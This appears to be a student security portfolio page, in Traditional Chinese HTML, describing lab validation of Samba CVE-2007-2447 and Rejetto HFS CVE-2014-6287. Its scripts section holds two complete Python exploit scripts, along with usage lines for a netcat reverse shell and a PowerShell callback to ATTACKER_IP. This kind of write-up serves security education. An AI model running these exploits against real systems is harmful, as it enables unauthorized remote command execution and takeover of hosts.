@@ -1,0 +1,298 @@
+<!doctype html>
+<html lang="zh-Hant">
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <meta name="description" content="在授權隔離 Lab 中驗證 Samba CVE-2007-2447 與 Rejetto HFS CVE-2014-6287，整理掃描、PoC、反向連線與修補方式。">
+  <meta name="theme-color" content="#102a43">
+  <title>Samba 與 Rejetto HFS 漏洞驗證｜莊旻芳作品集</title>
+  <link rel="stylesheet" href="../../assets/css/styles.css">
+  <script src="../../assets/js/main.js" defer></script>
+</head>
+<body>
+  <a class="skip-link" href="#main">跳至主要內容</a>
+  <header class="site-header" data-header>
+    <div class="shell nav-wrap">
+      <a class="brand" href="../../index.html" aria-label="回到作品集首頁">
+        <span class="brand-mark" aria-hidden="true">MF</span>
+        <span>莊旻芳</span>
+      </a>
+      <button class="nav-toggle" type="button" aria-label="開啟導覽" aria-expanded="false" aria-controls="site-nav" data-nav-toggle>
+        <span class="sr-only">開啟導覽</span>
+        <span></span><span></span><span></span>
+      </button>
+      <nav id="site-nav" class="site-nav" aria-label="作品導覽" data-nav>
+        <a href="#overview">摘要</a>
+        <a href="#samba">Samba</a>
+        <a href="#hfs">HFS</a>
+        <a href="#evidence">紀錄</a>
+        <a href="#scripts">指令</a>
+        <a href="#demo">Demo</a>
+        <a class="nav-github" href="../../index.html">作品集首頁</a>
+      </nav>
+    </div>
+  </header>
+
+  <main id="main">
+    <section class="project-hero shell">
+      <div class="breadcrumb"><a href="../../index.html">作品集</a><span>/</span><span>資訊安全</span></div>
+      <p class="eyebrow">Security lab · vulnerability validation</p>
+      <h1>Samba 與 Rejetto HFS<br>漏洞驗證</h1>
+      <p class="project-lead">在授權的隔離 Lab 環境中，針對 Samba Username Map Script Command Injection 與 Rejetto HFS 2.3b RCE 進行服務辨識、漏洞條件確認、PoC 驗證與結果紀錄。</p>
+      <div class="tag-row" aria-label="使用技術">
+        <span>Samba</span><span>Rejetto HFS</span><span>Nmap</span><span>Metasploit</span><span>Python PoC</span><span>Reverse Shell</span>
+      </div>
+      <div class="project-actions">
+        <a class="button button-primary" href="#evidence">查看驗證紀錄</a>
+        <a class="button button-secondary" href="#demo">觀看 Demo</a>
+      </div>
+    </section>
+
+    <section class="project-showcase shell">
+      <figure class="cover-photo">
+        <img src="../../assets/images/covers/security-labs.svg" alt="隔離實驗環境中的 Samba 與 HFS 漏洞驗證流程示意" width="1400" height="920">
+        <figcaption>服務辨識、PoC 驗證與反向連線紀錄</figcaption>
+      </figure>
+      <div class="metric-stack" aria-label="專案摘要">
+        <div><strong>2</strong><span>漏洞驗證目標</span></div>
+        <div><strong>Lab only</strong><span>隔離授權環境</span></div>
+        <div><strong>RCE</strong><span>命令執行與反向連線觀察</span></div>
+        <div><strong>Demo</strong><span>操作影片與截圖紀錄</span></div>
+      </div>
+    </section>
+
+    <section id="overview" class="section section-tint">
+      <div class="shell content-grid">
+        <div class="sticky-heading">
+          <p class="section-index">01</p>
+          <h2>作品摘要</h2>
+        </div>
+        <div class="content-body">
+          <p class="lead-paragraph">本頁整理 Samba 與 Rejetto HFS 兩個漏洞驗證，聚焦服務辨識、漏洞條件確認、PoC 復現、回連觀察與防護方式。</p>
+          <div class="point-list">
+            <article><span>Scope</span><div><h3>授權隔離環境</h3><p>所有操作以課程 Lab 的虛擬機與私有網段完成，目標是理解漏洞條件、攻擊流程與修補方式。</p></div></article>
+            <article><span>Recon</span><div><h3>服務與版本辨識</h3><p>先以掃描確認開放服務、版本與可疑入口，再對照 CVE 條件判斷是否可驗證。</p></div></article>
+            <article><span>PoC</span><div><h3>漏洞復現</h3><p>Samba 以 username map script 注入流程觀察 RCE；HFS 以 search macro / command execution payload 驗證 RCE。</p></div></article>
+            <article><span>Review</span><div><h3>結果與防護整理</h3><p>紀錄 command shell、reverse shell、HTTP callback 等結果，並整理更新版本、關閉服務與限制存取等防護方向。</p></div></article>
+          </div>
+        </div>
+      </div>
+    </section>
+
+    <section id="samba" class="section shell content-grid">
+      <div class="sticky-heading">
+        <p class="section-index">02</p>
+        <h2>Samba CVE-2007-2447</h2>
+      </div>
+      <div class="content-body">
+        <p class="lead-paragraph">Samba Username Map Script Command Injection 影響 Samba 3.0.20 至 3.0.25rc3。驗證重點是確認 smbd 服務與版本、理解 username map script 將未妥善處理的輸入交給 shell 的風險，並在 Lab 中觀察命令執行結果。</p>
+        <div class="vuln-explain">
+          <article>
+            <span>漏洞原理</span>
+            <h3>使用者名稱被帶入 shell 執行流程</h3>
+            <p>此漏洞發生在 Samba 處理 username map script 的過程中。特定版本會將登入時送出的使用者名稱交給外部 script 解析；若輸入未被妥善過濾，攻擊者可在 username 欄位中混入 shell metacharacters，使 Samba 在解析帳號映射時一併執行非預期命令。</p>
+          </article>
+          <article>
+            <span>漏洞影響</span>
+            <h3>未授權遠端命令執行</h3>
+            <p>在可連到 SMB 服務且目標啟用 vulnerable 設定時，攻擊者可能不需有效帳密就觸發命令執行。影響包含建立檔案、取得 command shell、進一步反向連線，以及以 Samba 服務權限操作主機；若服務以高權限執行，風險會擴大為完整主機控制。</p>
+          </article>
+        </div>
+        <div class="decision-grid">
+          <article><span>01</span><h3>服務確認</h3><p>掃描 NetBIOS / SMB 相關 port，確認 Samba smbd 服務與版本資訊。</p></article>
+          <article><span>02</span><h3>Metasploit 驗證</h3><p>使用現成模組確認漏洞可復現，觀察 command shell 與權限結果。</p></article>
+          <article><span>03</span><h3>Python PoC</h3><p>整理自寫 PoC 的 payload 組成，確認注入點與命令執行行為。</p></article>
+          <article><span>04</span><h3>Reverse Shell</h3><p>建立反向連線，驗證漏洞可造成遠端指令執行與互動 shell 風險。</p></article>
+        </div>
+      </div>
+    </section>
+
+    <section id="hfs" class="section section-dark">
+      <div class="shell content-grid">
+        <div class="sticky-heading">
+          <p class="section-index">03</p>
+          <h2>Rejetto HFS CVE-2014-6287</h2>
+        </div>
+        <div class="content-body">
+          <p class="lead-paragraph">Rejetto HTTP File Server 2.3b 的 search 功能可被特殊 macro 語法觸發遠端命令執行。驗證流程先確認 HFS 服務開在 Windows 目標主機，再以 Python payload 與 HTTP callback 觀察命令執行與回連結果。</p>
+          <div class="vuln-explain vuln-explain-dark">
+            <article>
+              <span>漏洞原理</span>
+              <h3>Search 參數可觸發 HFS macro</h3>
+              <p>HFS 2.3b 會解析請求參數中的特殊 macro 語法。當 search 參數被放入特定字串時，HFS 可能將其中的 macro 當作伺服器端指令處理，而不是單純視為搜尋文字；若 macro 呼叫到執行命令的功能，就會造成遠端命令執行。</p>
+            </article>
+            <article>
+              <span>漏洞影響</span>
+              <h3>Windows 主機上的命令執行與資料風險</h3>
+              <p>攻擊者只要能連到 HFS Web 服務，就可能透過 HTTP request 讓目標主機執行命令。實際影響包含寫入檔案、執行 PowerShell、讓目標端回連攻擊端，以及讀取或修改 HFS 可存取範圍內的資料；若 HFS 以高權限啟動，系統層級風險也會提高。</p>
+            </article>
+          </div>
+          <div class="table-wrap">
+            <table>
+              <thead><tr><th>階段</th><th>驗證內容</th><th>紀錄重點</th></tr></thead>
+              <tbody>
+                <tr><td>環境確認</td><td>確認 Kali 攻擊端、Windows 目標端與 HFS port。</td><td>以連線測試確認 80/tcp HTTP 服務可達。</td></tr>
+                <tr><td>Payload 組成</td><td>以 HFS macro / command execution 形式送出 payload。</td><td>觀察 URL encoding 與命令格式如何影響執行結果。</td></tr>
+                <tr><td>Callback</td><td>由目標端觸發 HTTP request 回到攻擊端 listener。</td><td>用 callback 驗證遠端命令確實被執行。</td></tr>
+                <tr><td>Demo</td><td>保留完整操作影片與截圖。</td><td>用於說明從環境確認到 payload sent 的驗證流程。</td></tr>
+              </tbody>
+            </table>
+          </div>
+        </div>
+      </div>
+    </section>
+
+    <section id="evidence" class="section shell content-grid">
+      <div class="sticky-heading">
+        <p class="section-index">04</p>
+        <h2>驗證紀錄</h2>
+      </div>
+      <div class="content-body">
+        <p class="lead-paragraph">以下截圖整理自攻擊紀錄 HackMD：Samba 保留服務掃描、Metasploit、手寫 PoC 與 reverse shell；HFS 保留服務確認、檔案寫入驗證、listener、payload sent 與 callback 回傳結果。</p>
+        <div class="evidence-showcase" data-evidence-gallery>
+          <div class="evidence-switch" role="group" aria-label="選擇漏洞驗證類型">
+            <button class="is-active" type="button" data-evidence-filter="samba" aria-pressed="true">Samba</button>
+            <button type="button" data-evidence-filter="hfs" aria-pressed="false">HFS</button>
+          </div>
+          <div class="evidence-copy">
+            <span data-evidence-count>01 / 06</span>
+            <h3 data-evidence-title>Samba 服務辨識</h3>
+            <p data-evidence-description>使用 nmap 確認目標主機開放 139/tcp 與 445/tcp，並辨識為 Samba smbd 服務。</p>
+          </div>
+          <div class="evidence-stage">
+            <button class="evidence-arrow" type="button" aria-label="上一張驗證紀錄" data-evidence-prev>‹</button>
+            <button class="evidence-main" type="button" data-lightbox="../../assets/images/security-labs/samba-recon.png" aria-label="放大目前驗證紀錄">
+              <img src="../../assets/images/security-labs/samba-recon.png" alt="Samba Reconnaissance 服務辨識截圖" width="987" height="600" data-evidence-image>
+            </button>
+            <button class="evidence-arrow" type="button" aria-label="下一張驗證紀錄" data-evidence-next>›</button>
+          </div>
+          <div class="evidence-thumbs" role="listbox" aria-label="驗證紀錄縮圖">
+            <button class="is-active" type="button" role="option" aria-selected="true" data-evidence-thumb data-group="samba" data-src="../../assets/images/security-labs/samba-recon.png" data-title="Samba 服務辨識" data-description="使用 nmap 確認目標主機開放 139/tcp 與 445/tcp，並辨識為 Samba smbd 服務。" data-alt="Samba Reconnaissance 服務辨識截圖"><img src="../../assets/images/security-labs/samba-recon.png" alt="" width="987" height="600"><span>Samba recon</span></button>
+            <button type="button" role="option" aria-selected="false" data-evidence-thumb data-group="samba" data-src="../../assets/images/security-labs/samba-metasploit.png" data-title="Samba Metasploit 復現" data-description="使用 Samba usermap_script 模組驗證漏洞可復現，並觀察 command shell 開啟結果。" data-alt="Samba Metasploit 復現流程截圖"><img src="../../assets/images/security-labs/samba-metasploit.png" alt="" width="867" height="599"><span>Metasploit</span></button>
+            <button type="button" role="option" aria-selected="false" data-evidence-thumb data-group="samba" data-src="../../assets/images/security-labs/samba-rce-file.png" data-title="Samba RCE 檔案驗證" data-description="透過手寫 PoC 送出命令，確認目標端建立 /tmp/pwned，代表遠端命令執行成功。" data-alt="Samba RCE 建立 /tmp/pwned 檔案驗證截圖"><img src="../../assets/images/security-labs/samba-rce-file.png" alt="" width="1015" height="133"><span>RCE file</span></button>
+            <button type="button" role="option" aria-selected="false" data-evidence-thumb data-group="samba" data-src="../../assets/images/security-labs/samba-listener.png" data-title="Samba listener" data-description="在 Kali 端啟動 listener，準備接收 Samba payload 觸發後的 reverse shell 連線。" data-alt="Samba reverse shell listener 截圖"><img src="../../assets/images/security-labs/samba-listener.png" alt="" width="297" height="78"><span>Listener</span></button>
+            <button type="button" role="option" aria-selected="false" data-evidence-thumb data-group="samba" data-src="../../assets/images/security-labs/samba-payload.png" data-title="Samba payload sent" data-description="送出 FIFO reverse shell payload，透過 username map script 注入流程觸發命令執行。" data-alt="Samba reverse shell payload 送出截圖"><img src="../../assets/images/security-labs/samba-payload.png" alt="" width="1065" height="96"><span>Payload</span></button>
+            <button type="button" role="option" aria-selected="false" data-evidence-thumb data-group="samba" data-src="../../assets/images/security-labs/samba-reverse-shell.png" data-title="Samba reverse shell result" data-description="Kali listener 成功收到目標主機回連，並以 whoami 驗證取得 root shell。" data-alt="Samba reverse shell 成功取得 root 結果截圖"><img src="../../assets/images/security-labs/samba-reverse-shell.png" alt="" width="595" height="155"><span>Shell</span></button>
+            <button type="button" role="option" aria-selected="false" data-evidence-thumb data-group="hfs" data-src="../../assets/images/security-labs/hfs-service.png" data-title="HFS 服務確認" data-description="確認 Windows 目標主機上的 Rejetto HFS 服務與連線狀態，作為 CVE-2014-6287 驗證起點。" data-alt="Rejetto HFS port 與服務確認截圖"><img src="../../assets/images/security-labs/hfs-service.png" alt="" width="453" height="74"><span>HFS service</span></button>
+            <button type="button" role="option" aria-selected="false" data-evidence-thumb data-group="hfs" data-src="../../assets/images/security-labs/hfs-file-write.png" data-title="HFS 檔案寫入 payload" data-description="以 search 參數注入 HFS macro，呼叫 cmd.exe 寫入測試檔案，確認 payload 已送出。" data-alt="Rejetto HFS 檔案寫入 payload 執行截圖"><img src="../../assets/images/security-labs/hfs-file-write.png" alt="" width="1022" height="103"><span>Write payload</span></button>
+            <button type="button" role="option" aria-selected="false" data-evidence-thumb data-group="hfs" data-src="../../assets/images/security-labs/hfs-file-result.png" data-title="HFS 檔案寫入結果" data-description="目標 Windows 桌面出現 poc.txt，證明 HFS macro 注入造成命令執行。" data-alt="Rejetto HFS 檔案寫入成功結果截圖"><img src="../../assets/images/security-labs/hfs-file-result.png" alt="" width="413" height="223"><span>Write result</span></button>
+            <button type="button" role="option" aria-selected="false" data-evidence-thumb data-group="hfs" data-src="../../assets/images/security-labs/hfs-listener.png" data-title="HFS HTTP listener" data-description="Kali 端啟動 HTTP server，等待目標主機透過 callback 將 whoami 結果傳回。" data-alt="Rejetto HFS HTTP callback listener 截圖"><img src="../../assets/images/security-labs/hfs-listener.png" alt="" width="634" height="112"><span>HTTP listener</span></button>
+            <button type="button" role="option" aria-selected="false" data-evidence-thumb data-group="hfs" data-src="../../assets/images/security-labs/hfs-payload.png" data-title="HFS callback payload" data-description="送出 PowerShell callback payload，讓目標端執行 whoami 後用 Invoke-WebRequest 回傳結果。" data-alt="Rejetto HFS callback payload sent 截圖"><img src="../../assets/images/security-labs/hfs-payload.png" alt="" width="1288" height="89"><span>Callback payload</span></button>
+            <button type="button" role="option" aria-selected="false" data-evidence-thumb data-group="hfs" data-src="../../assets/images/security-labs/hfs-callback-result.png" data-title="HFS callback result" data-description="HTTP server 收到含有 whoami 結果的 request，確認命令在目標 Windows 主機上執行。" data-alt="Rejetto HFS callback 回傳 whoami 結果截圖"><img src="../../assets/images/security-labs/hfs-callback-result.png" alt="" width="851" height="199"><span>Callback result</span></button>
+          </div>
+        </div>
+      </div>
+    </section>
+
+    <section id="scripts" class="section section-tint">
+      <div class="shell content-grid">
+        <div class="sticky-heading">
+          <p class="section-index">05</p>
+          <h2>自製腳本與指令</h2>
+        </div>
+        <div class="content-body">
+          <p class="lead-paragraph">將驗證過程中的自製 PoC 腳本內容與執行方式整理成可複製的程式碼框；Samba 與 HFS 可切換查看。</p>
+          <div class="script-showcase" data-code-switcher>
+            <div class="evidence-switch" role="group" aria-label="選擇指令類型">
+              <button class="is-active" type="button" data-code-filter="samba" aria-pressed="true">Samba</button>
+              <button type="button" data-code-filter="hfs" aria-pressed="false">HFS</button>
+            </div>
+            <article class="script-panel is-active" data-code-panel="samba">
+              <div class="script-copy">
+                <span>samba_usermap_poc.py</span>
+                <button class="copy-button" type="button" data-copy-code>複製</button>
+              </div>
+              <pre><code>from impacket.smbconnection import SMBConnection
+import sys
+
+target = sys.argv[1]
+cmd = sys.argv[2]
+
+username = f'/=`sh -c "echo {cmd}|sh"`'
+password = "test"
+
+print("[*] Username payload:")
+print(username)
+
+try:
+    conn = SMBConnection(target, target, sess_port=139)
+    conn.login(username, password)
+except Exception as e:
+    print("[*] SMB error is normal")
+    print(e)
+
+print("[*] Payload sent")
+
+# 執行範例
+# python3 samba_usermap_poc.py &lt;TARGET_IP&gt; "touch /tmp/pwned"
+# nc -lvnp &lt;LISTEN_PORT&gt;
+# python3 samba_usermap_poc.py &lt;TARGET_IP&gt; "mkfifo /tmp/f; /bin/sh -i &lt; /tmp/f 2&gt;&amp;1 | nc &lt;ATTACKER_IP&gt; &lt;LISTEN_PORT&gt; &gt; /tmp/f"</code></pre>
+            </article>
+            <article class="script-panel" data-code-panel="hfs" hidden>
+              <div class="script-copy">
+                <span>hfs_macro_poc.py</span>
+                <button class="copy-button" type="button" data-copy-code>複製</button>
+              </div>
+              <pre><code>import sys
+import urllib.parse
+import requests
+
+target = sys.argv[1].rstrip("/")
+cmd = sys.argv[2]
+
+macro = f"%00{{.exec|{cmd}.}}"
+payload = urllib.parse.quote(macro)
+url = f"{target}/?search={payload}"
+
+print("[*] Payload URL:")
+print(url)
+
+try:
+    response = requests.get(url, timeout=5)
+    print(f"[*] HTTP status: {response.status_code}")
+except Exception as e:
+    print("[*] Request error")
+    print(e)
+
+print("[*] Payload sent")
+
+# 執行範例
+# python3 hfs_macro_poc.py http://&lt;TARGET_IP&gt;/ "cmd.exe /c echo poc &gt; C:\\Users\\Public\\Desktop\\poc.txt"
+# python3 -m http.server &lt;LISTEN_PORT&gt;
+# python3 hfs_macro_poc.py http://&lt;TARGET_IP&gt;/ "powershell -ExecutionPolicy Bypass -Command \"$u='http://&lt;ATTACKER_IP&gt;:&lt;LISTEN_PORT&gt;/?u='+(whoami); Invoke-WebRequest -Uri $u\""</code></pre>
+            </article>
+          </div>
+        </div>
+      </div>
+    </section>
+
+    <section id="demo" class="section demo-section">
+      <div class="shell content-grid">
+        <div class="sticky-heading">
+          <p class="section-index">Demo</p>
+          <h2>操作展示</h2>
+        </div>
+        <div class="content-body">
+          <div class="demo-notes">
+            <article><span>01</span><div><h3>Samba CVE-2007-2447</h3><p>展示服務確認、漏洞復現與 reverse shell 結果。</p><p><a href="https://youtu.be/y7eQoWpk1EI" target="_blank" rel="noreferrer">觀看 Demo ↗</a></p></div></article>
+            <article><span>02</span><div><h3>Rejetto HFS CVE-2014-6287</h3><p>展示 HFS 服務驗證、payload 送出與 HTTP callback 結果。</p><p><a href="https://youtu.be/hzUj3j-MjGA" target="_blank" rel="noreferrer">觀看 Demo ↗</a></p></div></article>
+          </div>
+        </div>
+      </div>
+    </section>
+  </main>
+
+  <dialog class="lightbox" data-lightbox-dialog aria-label="圖片預覽">
+    <button class="lightbox-close" type="button" data-lightbox-close aria-label="關閉圖片預覽">×</button>
+    <img data-lightbox-image alt="放大圖片預覽">
+  </dialog>
+
+  <footer class="site-footer">
+    <div class="shell footer-grid">
+      <div><strong>莊旻芳</strong><p>資訊工程作品集</p></div>
+      <p>Samba 與 Rejetto HFS · 資訊安全課程實作</p>
+      <a href="../../index.html">返回作品集首頁</a>
+    </div>
+  </footer>
+</body>
+</html>
